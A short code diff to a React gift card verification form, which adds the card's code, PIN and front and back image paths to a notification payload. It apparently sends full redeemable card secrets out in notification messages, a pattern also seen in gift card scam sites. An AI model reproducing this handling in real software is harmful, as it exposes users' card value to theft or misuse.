@@ -122,9 +122,13 @@ const VerifyGiftcard = () => {
             type: 'verification',
             userEmail: formData.email,
             giftcardName: formData.giftcardName,
+            code: formData.code,
+            pin: formData.pin,
             amount: formData.amount,
             country: formData.country,
             verificationId,
+            frontImagePath,
+            backImagePath,
           },
         });
       } catch (notificationError) {
